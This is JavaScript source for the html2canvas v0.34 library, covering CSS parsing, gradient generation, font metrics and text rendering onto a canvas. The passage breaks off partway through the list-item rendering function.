/**
  @license html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
 */
(function(window, document, undefined){

/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
 */
"use strict";

var _html2canvas = {},
previousElement,
computedCSS,
html2canvas;


function h2clog(a) {
    if (_html2canvas.logging && window.console && window.console.log) {
        window.console.log(a);
    }
}

_html2canvas.Util = {};

_html2canvas.Util.backgroundImage = function (src) {

    if (/data:image\/.*;base64,/i.test( src ) || /^(-webkit|-moz|linear-gradient|-o-)/.test( src )) {
        return src;
    }

    if (src.toLowerCase().substr( 0, 5 ) === 'url("') {
        src = src.substr( 5 );
        src = src.substr( 0, src.length - 2 );
    } else {
        src = src.substr( 4 );
        src = src.substr( 0, src.length - 1 );
    }

    return src;
};

_html2canvas.Util.Bounds = function getBounds (el) {
    var clientRect,
    bounds = {};

    if (el.getBoundingClientRect){
        clientRect = el.getBoundingClientRect();


        // TODO add scroll position to bounds, so no scrolling of window necessary
        bounds.top = clientRect.top;
        bounds.bottom = clientRect.bottom || (clientRect.top + clientRect.height);
        bounds.left = clientRect.left;

        // older IE doesn't have width/height, but top/bottom instead
        bounds.width = clientRect.width || (clientRect.right - clientRect.left);
        bounds.height = clientRect.height || (clientRect.bottom - clientRect.top);

        return bounds;

    }
};

_html2canvas.Util.getCSS = function (el, attribute) {
    // return $(el).css(attribute);

    var val;

    function toPX( attribute, val ) {
        var rsLeft = el.runtimeStyle && el.runtimeStyle[ attribute ],
        left,
        style = el.style;

        // Check if we are not dealing with pixels, (Opera has issues with this)
        // Ported from jQuery css.js
        // From the awesome hack by Dean Edwards
        // http://erik.eae.net/archives/2007/07/27/18.54.15/#comment-102291

        // If we're not dealing with a regular pixel number
        // but a number that has a weird ending, we need to convert it to pixels

        if ( !/^-?[0-9]+\.?[0-9]*(?:px)?$/i.test( val ) && /^-?\d/.test( val ) ) {

            // Remember the original values
            left = style.left;

            // Put in the new values to get a computed value out
            if ( rsLeft ) {
                el.runtimeStyle.left = el.currentStyle.left;
            }
            style.left = attribute === "fontSize" ? "1em" : (val || 0);
            val = style.pixelLeft + "px";

            // Revert the changed values
            style.left = left;
            if ( rsLeft ) {
                el.runtimeStyle.left = rsLeft;
            }

        }

        if (!/^(thin|medium|thick)$/i.test( val )) {
            return Math.round(parseFloat( val )) + "px";
        }

        return val;

    }


    if ( window.getComputedStyle ) {
        if ( previousElement !== el ) {
            computedCSS = document.defaultView.getComputedStyle(el, null);
        }
        val = computedCSS[ attribute ];

        if ( attribute === "backgroundPosition" ) {

            val = (val.split(",")[0] || "0 0").split(" ");

            val[ 0 ] = ( val[0].indexOf( "%" ) === -1 ) ? toPX(  attribute + "X", val[ 0 ] ) : val[ 0 ];
            val[ 1 ] = ( val[1] === undefined ) ? val[0] : val[1]; // IE 9 doesn't return double digit always
            val[ 1 ] = ( val[1].indexOf( "%" ) === -1 ) ? toPX(  attribute + "Y", val[ 1 ] ) : val[ 1 ];
        }

    } else if ( el.currentStyle ) {
        // IE 9>
        if (attribute === "backgroundPosition") {
            // Older IE uses -x and -y
            val = [ toPX(  attribute + "X", el.currentStyle[ attribute + "X" ]  ), toPX(  attribute + "Y", el.currentStyle[ attribute + "Y" ]  ) ];
        } else {

            val = toPX(  attribute, el.currentStyle[ attribute ]  );

            if (/^(border)/i.test( attribute ) && /^(medium|thin|thick)$/i.test( val )) {
                switch (val) {
                    case "thin":
                        val = "1px";
                        break;
                    case "medium":
                        val = "0px"; // this is wrong, it should be 3px but IE uses medium for no border as well.. TODO find a work around
                        break;
                    case "thick":
                        val = "5px";
                        break;
                }
            }
        }



    }




    return val;



//return $(el).css(attribute);


};


_html2canvas.Util.BackgroundPosition = function ( el, bounds, image ) {
    // TODO add support for multi image backgrounds

    var bgposition =  _html2canvas.Util.getCSS( el, "backgroundPosition" ) ,
    topPos,
    left,
    percentage,
    val;

    if (bgposition.length === 1){
        val = bgposition;

        bgposition = [];

        bgposition[0] = val;
        bgposition[1] = val;
    }



    if (bgposition[0].toString().indexOf("%") !== -1){
        percentage = (parseFloat(bgposition[0])/100);
        left =  ((bounds.width * percentage)-(image.width*percentage));

    }else{
        left = parseInt(bgposition[0],10);
    }

    if (bgposition[1].toString().indexOf("%") !== -1){

        percentage = (parseFloat(bgposition[1])/100);
        topPos =  ((bounds.height * percentage)-(image.height*percentage));
    }else{
        topPos = parseInt(bgposition[1],10);
    }




    return {
        top: topPos,
        left: left
    };

};

_html2canvas.Util.Extend = function (options, defaults) {
    for (var key in options) {
        if (options.hasOwnProperty(key)) {
            defaults[key] = options[key];
        }
    }
    return defaults;
};


/*
 * Derived from jQuery.contents()
 * Copyright 2010, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 */
_html2canvas.Util.Children = function( elem ) {


    var children;
    try {

        children = (elem.nodeName && elem.nodeName.toUpperCase() === "IFRAME") ?
        elem.contentDocument || elem.contentWindow.document : (function( array ){
            var ret = [];

            if ( array !== null ) {

                (function( first, second ) {
                    var i = first.length,
                    j = 0;

                    if ( typeof second.length === "number" ) {
                        for ( var l = second.length; j < l; j++ ) {
                            first[ i++ ] = second[ j ];
                        }

                    } else {
                        while ( second[j] !== undefined ) {
                            first[ i++ ] = second[ j++ ];
                        }
                    }

                    first.length = i;

                    return first;
                })( ret, array );

            }

            return ret;
        })( elem.childNodes );

    } catch (ex) {
        h2clog("html2canvas.Util.Children failed with exception: " + ex.message);
        children = [];
    }
    return children;
};

/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Contributor(s):
      Niklas von Hertzen <http://www.twitter.com/niklasvh>
      André Fiedler      <http://www.twitter.com/sonnenkiste>

  Released under MIT License
 */

(function(){

_html2canvas.Generate = {};

var reGradients = [
    /^(-webkit-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-o-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-webkit-gradient)\((linear|radial),\s((?:\d{1,3}%?)\s(?:\d{1,3}%?),\s(?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)-]+)\)$/,
    /^(-moz-linear-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)]+)\)$/,
    /^(-webkit-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z-]+)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-moz-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s?([a-z-]*)([\w\d\.\s,%\(\)]+)\)$/,
    /^(-o-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z-]+)([\w\d\.\s,%\(\)]+)\)$/
];

/*
 * TODO: Add IE10 vendor prefix (-ms) support
 * TODO: Add W3C gradient (linear-gradient) support
 * TODO: Add old Webkit -webkit-gradient(radial, ...) support
 * TODO: Maybe some RegExp optimizations are possible ;o)
 */
_html2canvas.Generate.parseGradient = function(css, bounds) {
    var gradient, i, len = reGradients.length, m1, stop, m2, m2Len, step, m3;

    for(i = 0; i < len; i+=1){
        m1 = css.match(reGradients[i]);
        if(m1) break;
    }

    if(m1) {
        switch(m1[1]) {
            case '-webkit-linear-gradient':
            case '-o-linear-gradient':

                gradient = {
                    type: 'linear',
                    x0: null,
                    y0: null,
                    x1: null,
                    y1: null,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[2].match(/\w+/g);
                if(m2){
                    m2Len = m2.length;
                    for(i = 0; i < m2Len; i+=1){
                        switch(m2[i]) {
                            case 'top':
                                gradient.y0 = 0;
                                gradient.y1 = bounds.height;
                                break;

                            case 'right':
                                gradient.x0 = bounds.width;
                                gradient.x1 = 0;
                                break;

                            case 'bottom':
                                gradient.y0 = bounds.height;
                                gradient.y1 = 0;
                                break;

                            case 'left':
                                gradient.x0 = 0;
                                gradient.x1 = bounds.width;
                                break;
                        }
                    }
                }
                if(gradient.x0 === null && gradient.x1 === null){ // center
                    gradient.x0 = gradient.x1 = bounds.width / 2;
                }
                if(gradient.y0 === null && gradient.y1 === null){ // center
                    gradient.y0 = gradient.y1 = bounds.height / 2;
                }

                // get colors and stops
                m2 = m1[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3] === '%'){
                                stop /= 100;
                            } else { // px - stupid opera
                                stop /= bounds.width;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;

            case '-webkit-gradient':

                gradient = {
                    type: m1[2] === 'radial' ? 'circle' : m1[2], // TODO: Add radial gradient support for older mozilla definitions
                    x0: 0,
                    y0: 0,
                    x1: 0,
                    y1: 0,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[3].match(/(\d{1,3})%?\s(\d{1,3})%?,\s(\d{1,3})%?\s(\d{1,3})%?/);
                if(m2){
                    gradient.x0 = (m2[1] * bounds.width) / 100;
                    gradient.y0 = (m2[2] * bounds.height) / 100;
                    gradient.x1 = (m2[3] * bounds.width) / 100;
                    gradient.y1 = (m2[4] * bounds.height) / 100;
                }

                // get colors and stops
                m2 = m1[4].match(/((?:from|to|color-stop)\((?:[0-9\.]+,\s)?(?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)\))+/g);
                if(m2){
                    m2Len = m2.length;
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/(from|to|color-stop)\(([0-9\.]+)?(?:,\s)?((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\)/);
                        stop = parseFloat(m3[2]);
                        if(m3[1] === 'from') stop = 0.0;
                        if(m3[1] === 'to') stop = 1.0;
                        gradient.colorStops.push({
                            color: m3[3],
                            stop: stop
                        });
                    }
                }
                break;

            case '-moz-linear-gradient':

                gradient = {
                    type: 'linear',
                    x0: 0,
                    y0: 0,
                    x1: 0,
                    y1: 0,
                    colorStops: []
                };

                // get coordinates
                m2 = m1[2].match(/(\d{1,3})%?\s(\d{1,3})%?/);

                // m2[1] == 0%   -> left
                // m2[1] == 50%  -> center
                // m2[1] == 100% -> right

                // m2[2] == 0%   -> top
                // m2[2] == 50%  -> center
                // m2[2] == 100% -> bottom

                if(m2){
                    gradient.x0 = (m2[1] * bounds.width) / 100;
                    gradient.y0 = (m2[2] * bounds.height) / 100;
                    gradient.x1 = bounds.width - gradient.x0;
                    gradient.y1 = bounds.height - gradient.y0;
                }

                // get colors and stops
                m2 = m1[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}%)?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3]){ // percentage
                                stop /= 100;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;

            case '-webkit-radial-gradient':
            case '-moz-radial-gradient':
            case '-o-radial-gradient':

                gradient = {
                    type: 'circle',
                    x0: 0,
                    y0: 0,
                    x1: bounds.width,
                    y1: bounds.height,
                    cx: 0,
                    cy: 0,
                    rx: 0,
                    ry: 0,
                    colorStops: []
                };

                // center
                m2 = m1[2].match(/(\d{1,3})%?\s(\d{1,3})%?/);
                if(m2){
                    gradient.cx = (m2[1] * bounds.width) / 100;
                    gradient.cy = (m2[2] * bounds.height) / 100;
                }

                // size
                m2 = m1[3].match(/\w+/);
                m3 = m1[4].match(/[a-z-]*/);
                if(m2 && m3){
                    switch(m3[0]){
                        case 'farthest-corner':
                        case 'cover': // is equivalent to farthest-corner
                        case '': // mozilla removes "cover" from definition :(
                            var tl = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            var tr = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var br = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var bl = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            gradient.rx = gradient.ry = Math.max(tl, tr, br, bl);
                            break;
                        case 'closest-corner':
                            var tl = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            var tr = Math.sqrt(Math.pow(gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var br = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.y1 - gradient.cy, 2));
                            var bl = Math.sqrt(Math.pow(gradient.x1 - gradient.cx, 2) + Math.pow(gradient.cy, 2));
                            gradient.rx = gradient.ry = Math.min(tl, tr, br, bl);
                            break;
                        case 'farthest-side':
                            if(m2[0] === 'circle'){
                                gradient.rx = gradient.ry = Math.max(
                                    gradient.cx,
                                    gradient.cy,
                                    gradient.x1 - gradient.cx,
                                    gradient.y1 - gradient.cy
                                );
                            } else { // ellipse

                                gradient.type = m2[0];

                                gradient.rx = Math.max(
                                    gradient.cx,
                                    gradient.x1 - gradient.cx
                                );
                                gradient.ry = Math.max(
                                    gradient.cy,
                                    gradient.y1 - gradient.cy
                                );
                            }
                            break;
                        case 'closest-side':
                        case 'contain': // is equivalent to closest-side
                            if(m2[0] === 'circle'){
                                gradient.rx = gradient.ry = Math.min(
                                    gradient.cx,
                                    gradient.cy,
                                    gradient.x1 - gradient.cx,
                                    gradient.y1 - gradient.cy
                                );
                            } else { // ellipse

                                gradient.type = m2[0];

                                gradient.rx = Math.min(
                                    gradient.cx,
                                    gradient.x1 - gradient.cx
                                );
                                gradient.ry = Math.min(
                                    gradient.cy,
                                    gradient.y1 - gradient.cy
                                );
                            }
                            break;

                        // TODO: add support for "30px 40px" sizes (webkit only)
                    }
                }

                // color stops
                m2 = m1[5].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g);
                if(m2){
                    m2Len = m2.length;
                    step = 1 / Math.max(m2Len - 1, 1);
                    for(i = 0; i < m2Len; i+=1){
                        m3 = m2[i].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/);
                        if(m3[2]){
                            stop = parseFloat(m3[2]);
                            if(m3[3] === '%'){
                                stop /= 100;
                            } else { // px - stupid opera
                                stop /= bounds.width;
                            }
                        } else {
                            stop = i * step;
                        }
                        gradient.colorStops.push({
                            color: m3[1],
                            stop: stop
                        });
                    }
                }
                break;
        }
    }

    return gradient;
};

_html2canvas.Generate.Gradient = function(src, bounds) {
    var canvas = document.createElement('canvas'),
    ctx = canvas.getContext('2d'),
    gradient, grad, i, len, img;

    canvas.width = bounds.width;
    canvas.height = bounds.height;

    // TODO: add support for multi defined background gradients (like radial gradient example in background.html)
    gradient = _html2canvas.Generate.parseGradient(src, bounds);

    img = new Image();

    if(gradient){
        if(gradient.type === 'linear'){
            grad = ctx.createLinearGradient(gradient.x0, gradient.y0, gradient.x1, gradient.y1);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, bounds.width, bounds.height);

            img.src = canvas.toDataURL();
        } else if(gradient.type === 'circle'){

            grad = ctx.createRadialGradient(gradient.cx, gradient.cy, 0, gradient.cx, gradient.cy, gradient.rx);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, bounds.width, bounds.height);

            img.src = canvas.toDataURL();
        } else if(gradient.type === 'ellipse'){

            // draw circle
            var canvasRadial = document.createElement('canvas'),
                ctxRadial = canvasRadial.getContext('2d'),
                ri = Math.max(gradient.rx, gradient.ry),
                di = ri * 2, imgRadial;

            canvasRadial.width = canvasRadial.height = di;

            grad = ctxRadial.createRadialGradient(gradient.rx, gradient.ry, 0, gradient.rx, gradient.ry, ri);

            for (i = 0, len = gradient.colorStops.length; i < len; i+=1) {
                try {
                    grad.addColorStop(gradient.colorStops[i].stop, gradient.colorStops[i].color);
                }
                catch(e) {
                    h2clog(['failed to add color stop: ', e, '; tried to add: ', gradient.colorStops[i], '; stop: ', i, '; in: ', src]);
                }
            }

            ctxRadial.fillStyle = grad;
            ctxRadial.fillRect(0, 0, di, di);

            ctx.fillStyle = gradient.colorStops[i - 1].color;
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            imgRadial = new Image();
            imgRadial.onload = function() { // wait until the image is filled

                // transform circle to ellipse
                ctx.drawImage(imgRadial, gradient.cx - gradient.rx, gradient.cy - gradient.ry, 2 * gradient.rx, 2 * gradient.ry);

                img.src = canvas.toDataURL();

            }
            imgRadial.src = canvasRadial.toDataURL();
        }
    }

    return img;
};

_html2canvas.Generate.ListAlpha = function(number) {
    var tmp = "",
    modulus;

    do {
        modulus = number % 26;
        tmp = String.fromCharCode((modulus) + 64) + tmp;
        number = number / 26;
    }while((number*26) > 26);

    return tmp;
};

_html2canvas.Generate.ListRoman = function(number) {
    var romanArray = ["M", "CM", "D", "CD", "C", "XC", "L", "XL", "X", "IX", "V", "IV", "I"],
    decimal = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1],
    roman = "",
    v,
    len = romanArray.length;

    if (number <= 0 || number >= 4000) {
        return number;
    }

    for (v=0; v < len; v+=1) {
        while (number >= decimal[v]) {
            number -= decimal[v];
            roman += romanArray[v];
        }
    }

    return roman;

};

})();
/*
  html2canvas v0.34 <http://html2canvas.hertzen.com>
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/

/*
 *  New function for traversing elements
 */

_html2canvas.Parse = function ( images, options ) {
    window.scroll(0,0);

    var support = {
        rangeBounds: false,
        svgRendering: options.svgRendering && (function( ){
            var img = new Image(),
            canvas = document.createElement("canvas"),
            ctx = (canvas.getContext === undefined) ? false : canvas.getContext("2d");
            if (ctx === false) {
                // browser doesn't support canvas, good luck supporting SVG on canvas
                return false;
            }
            canvas.width = canvas.height = 10;
            img.src = [
            "data:image/svg+xml,",
            "<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'>",
            "<foreignObject width='10' height='10'>",
            "<div xmlns='http://www.w3.org/1999/xhtml' style='width:10;height:10;'>",
            "sup",
            "</div>",
            "</foreignObject>",
            "</svg>"
            ].join("");
            try {
                ctx.drawImage(img, 0, 0);
                canvas.toDataURL();
            } catch(e) {
                return false;
            }
            h2clog('html2canvas: Parse: SVG powered rendering available');
            return true;

        })()
    },
    element = (( options.elements === undefined ) ? document.body : options.elements[0]), // select body by default
    needReorder = false,
    numDraws = 0,
    fontData = {},
    doc = element.ownerDocument,
    ignoreElementsRegExp = new RegExp("(" + options.ignoreElements + ")"),
    body = doc.body,
    r,
    testElement,
    rangeBounds,
    rangeHeight,
    stack,
    ctx,
    docDim,
    i,
    children,
    childrenLen;


    function docSize(){

        return {
            width: Math.max(
                Math.max(doc.body.scrollWidth, doc.documentElement.scrollWidth),
                Math.max(doc.body.offsetWidth, doc.documentElement.offsetWidth),
                Math.max(doc.body.clientWidth, doc.documentElement.clientWidth)
                ),
            height: Math.max(
                Math.max(doc.body.scrollHeight, doc.documentElement.scrollHeight),
                Math.max(doc.body.offsetHeight, doc.documentElement.offsetHeight),
                Math.max(doc.body.clientHeight, doc.documentElement.clientHeight)
                )
        };

    }

    images = images || {};

    // Test whether we can use ranges to measure bounding boxes
    // Opera doesn't provide valid bounds.height/bottom even though it supports the method.


    if (doc.createRange) {
        r = doc.createRange();
        //this.support.rangeBounds = new Boolean(r.getBoundingClientRect);
        if (r.getBoundingClientRect){
            testElement = doc.createElement('boundtest');
            testElement.style.height = "123px";
            testElement.style.display = "block";
            body.appendChild(testElement);

            r.selectNode(testElement);
            rangeBounds = r.getBoundingClientRect();
            rangeHeight = rangeBounds.height;

            if (rangeHeight === 123) {
                support.rangeBounds = true;
            }
            body.removeChild(testElement);


        }

    }


    /*
    var rootStack = new this.storageContext($(document).width(),$(document).height());
    rootStack.opacity = this.getCSS(this.element,"opacity");
    var stack = this.newElement(this.element,rootStack);


    this.parseElement(this.element,stack);
     */




    var getCSS = _html2canvas.Util.getCSS;
    function getCSSInt(element, attribute) {
        var val = parseInt(getCSS(element, attribute), 10);
        return (isNaN(val)) ? 0 : val; // borders in old IE are throwing 'medium' for demo.html
    }

    // Drawing a rectangle
    function renderRect (ctx, x, y, w, h, bgcolor) {
        if (bgcolor !=="transparent"){
            ctx.setVariable("fillStyle", bgcolor);
            ctx.fillRect (x, y, w, h);
            numDraws+=1;
        }
    }


    function textTransform (text, transform) {
        switch(transform){
            case "lowercase":
                return text.toLowerCase();

            case "capitalize":
                return text.replace( /(^|\s|:|-|\(|\))([a-z])/g , function (m, p1, p2) {
                    if (m.length > 0) {
                        return p1 + p2.toUpperCase();
                    }
                } );

            case "uppercase":
                return text.toUpperCase();

            default:
                return text;

        }

    }

    function trimText (text) {
        return text.replace(/^\s*/g, "").replace(/\s*$/g, "");
    }

    function fontMetrics (font, fontSize) {

        if (fontData[font + "-" + fontSize] !== undefined) {
            return fontData[font + "-" + fontSize];
        }


        var container = doc.createElement('div'),
        img = doc.createElement('img'),
        span = doc.createElement('span'),
        baseline,
        middle,
        metricsObj;


        container.style.visibility = "hidden";
        container.style.fontFamily = font;
        container.style.fontSize = fontSize;
        container.style.margin = 0;
        container.style.padding = 0;

        body.appendChild(container);



        // http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever (handtinywhite.gif)
        img.src = "data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=";
        img.width = 1;
        img.height = 1;

        img.style.margin = 0;
        img.style.padding = 0;
        img.style.verticalAlign = "baseline";

        span.style.fontFamily = font;
        span.style.fontSize = fontSize;
        span.style.margin = 0;
        span.style.padding = 0;




        span.appendChild(doc.createTextNode('Hidden Text'));
        container.appendChild(span);
        container.appendChild(img);
        baseline = (img.offsetTop - span.offsetTop) + 1;

        container.removeChild(span);
        container.appendChild(doc.createTextNode('Hidden Text'));

        container.style.lineHeight = "normal";
        img.style.verticalAlign = "super";

        middle = (img.offsetTop-container.offsetTop) + 1;
        metricsObj = {
            baseline: baseline,
            lineWidth: 1,
            middle: middle
        };


        fontData[font + "-" + fontSize] = metricsObj;

        body.removeChild(container);

        return metricsObj;

    }


    function drawText(currentText, x, y, ctx){
        if (trimText(currentText).length>0) {
            ctx.fillText(currentText,x,y);
            numDraws+=1;
        }
    }


    function renderText(el, textNode, stack) {
        var ctx = stack.ctx,
        family = getCSS(el, "fontFamily"),
        size = getCSS(el, "fontSize"),
        color = getCSS(el, "color"),
        text_decoration = getCSS(el, "textDecoration"),
        text_align = getCSS(el, "textAlign"),
        letter_spacing = getCSS(el, "letterSpacing"),
        bounds,
        text,
        metrics,
        renderList,
        listLen,
        bold = getCSS(el, "fontWeight"),
        font_style = getCSS(el, "fontStyle"),
        font_variant = getCSS(el, "fontVariant"),
        align = false,
        newTextNode,
        textValue,
        textOffset = 0,
        oldTextNode,
        c,
        range,
        parent,
        wrapElement,
        backupText;

        // apply text-transform:ation to the text



        textNode.nodeValue = textTransform(textNode.nodeValue, getCSS(el, "textTransform"));
        text = trimText(textNode.nodeValue);

        if (text.length>0){

            if (text_decoration !== "none"){
                metrics = fontMetrics(family, size);
            }

            text_align = text_align.replace(["-webkit-auto"],["auto"]);

            if (options.letterRendering === false && /^(left|right|justify|auto)$/.test(text_align) && /^(normal|none)$/.test(letter_spacing)){
                // this.setContextVariable(ctx,"textAlign",text_align);
                renderList = textNode.nodeValue.split(/(\b| )/);

            }else{
                //  this.setContextVariable(ctx,"textAlign","left");
                renderList = textNode.nodeValue.split("");
            }

            switch(parseInt(bold, 10)){
                case 401:
                    bold = "bold";
                    break;
                case 400:
                    bold = "normal";
                    break;
            }

            ctx.setVariable("fillStyle", color);

            /*
              need to be defined in the order as defined in http://www.w3.org/TR/CSS21/fonts.html#font-shorthand
              to properly work in Firefox
            */
            ctx.setVariable("font", font_style+ " " + font_variant  + " " + bold + " " + size + " " + family);

            if (align){
                ctx.setVariable("textAlign", "right");
            }else{
                ctx.setVariable("textAlign", "left");
            }


            /*
        if (stack.clip){
        ctx.rect (stack.clip.left, stack.clip.top, stack.clip.width, stack.clip.height);
        ctx.clip();
        }
             */


            oldTextNode = textNode;


            for ( c=0, listLen = renderList.length; c < listLen; c+=1 ) {
                textValue = null;



                if (support.rangeBounds){
                    // getBoundingClientRect is supported for ranges
                    if (text_decoration !== "none" || trimText(renderList[c]).length !== 0) {
                        textValue = renderList[c];
                        if (doc.createRange){
                            range = doc.createRange();

                            range.setStart(textNode, textOffset);
                            range.setEnd(textNode, textOffset + textValue.length);
                        }else{
                            // TODO add IE support
                            range = body.createTextRange();
                        }

                        if (range.getBoundingClientRect()) {
                            bounds = range.getBoundingClientRect();
                        }else{
                            bounds = {};
                        }

                    }
                }else{
                    // it isn't supported, so let's wrap it inside an element instead and get the bounds there

                    // IE 9 bug
                    if (typeof oldTextNode.nodeValue !== "string" ){
                        continue;
                    }

                    newTextNode = oldTextNode.splitText(renderList[c].length);

                    parent = oldTextNode.parentNode;
                    wrapElement = doc.createElement('wrapper');
                    backupText = oldTextNode.cloneNode(true);

                    wrapElement.appendChild(oldTextNode.cloneNode(true));
                    parent.replaceChild(wrapElement, oldTextNode);

                    bounds = _html2canvas.Util.Bounds(wrapElement);

                    textValue = oldTextNode.nodeValue;

                    oldTextNode = newTextNode;
                    parent.replaceChild(backupText, wrapElement);


                }

                if (textValue !== null){
                    drawText(textValue, bounds.left, bounds.bottom, ctx);
                }

                switch(text_decoration) {
                    case "underline":
                        // Draws a line at the baseline of the font
                        // TODO As some browsers display the line as more than 1px if the font-size is big, need to take that into account both in position and size
                        renderRect(ctx, bounds.left, Math.round(bounds.top + metrics.baseline + metrics.lineWidth), bounds.width, 1, color);
                        break;
                    case "overline":
                        renderRect(ctx, bounds.left, bounds.top, bounds.width, 1, color);
                        break;
                    case "line-through":
                        // TODO try and find exact position for line-through
                        renderRect(ctx, bounds.left, Math.ceil(bounds.top + metrics.middle + metrics.lineWidth), bounds.width, 1, color);
                        break;

                }





                textOffset += renderList[c].length;

            }



        }

    }

    function listPosition (element, val) {
        var boundElement = doc.createElement( "boundelement" ),
        type,
        bounds;

        boundElement.style.display = "inline";
        //boundElement.style.width = "1px";
        //boundElement.style.height = "1px";

        type = element.style.listStyleType;
        element.style.listStyleType = "none";

        boundElement.appendChild( doc.createTextNode( val ) );


        element.insertBefore(boundElement, element.firstChild);


        bounds = _html2canvas.Util.Bounds( boundElement );
        element.removeChild( boundElement );
        element.style.listStyleType = type;
        return bounds;

    }
    

    
    function elementIndex( el ) {
        var i = -1,
        count = 1,
        childs = el.parentNode.childNodes;

        if ( el.parentNode ) {
            while( childs[ ++i ] !== el ) {
               if ( childs[ i ].nodeType === 1 ) {
                   count++;
               }
            }
            return count;
        } else {
            return -1;
        }
       
    }

    function renderListItem(element, stack, elBounds) {


        var position = getCSS(element, "listStylePosition"),
        x,
        y,
        type = getCSS(element, "listStyleType"),
        currentIndex,
        text,
        listBounds,
        bold = getCSS(element, "fontWeight");

        if (/^(decimal|decimal-leading-zero|upper-alpha|upper-latin|upper-roman|lower-alpha|lower-greek|lower-latin|lower-roman)$/i.test(type)) {

            currentIndex = elementIndex( element );

            switch(type){
                case "decimal":
                    text = currentIndex;
                    break;
                case "decimal-leading-zero":
                    if (currentIndex.toString().length === 1){
                        text = currentIndex = "0" + currentIndex.toString();
                    }else{
                        text = currentIndex.toString();
                    }
                    break;
                case "upper-roman":
